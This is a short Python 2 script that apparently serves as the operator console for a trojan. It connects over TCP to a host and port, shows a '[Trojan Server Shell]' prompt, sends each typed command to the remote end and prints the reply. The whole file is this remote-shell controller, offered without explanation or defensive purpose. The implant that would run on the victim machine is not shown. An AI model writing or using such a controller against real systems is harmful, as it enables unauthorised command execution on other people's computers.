import socket

thost = "0.0.0.0"
tport = 9623

tcpclient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpclient.connect((thost, tport))

while True:
	shellcmd = raw_input("[Trojan Server Shell] %s:%d> "%(thost,tport))
	tcpclient.send(shellcmd)

	response = tcpclient.recv(4096)
	print response
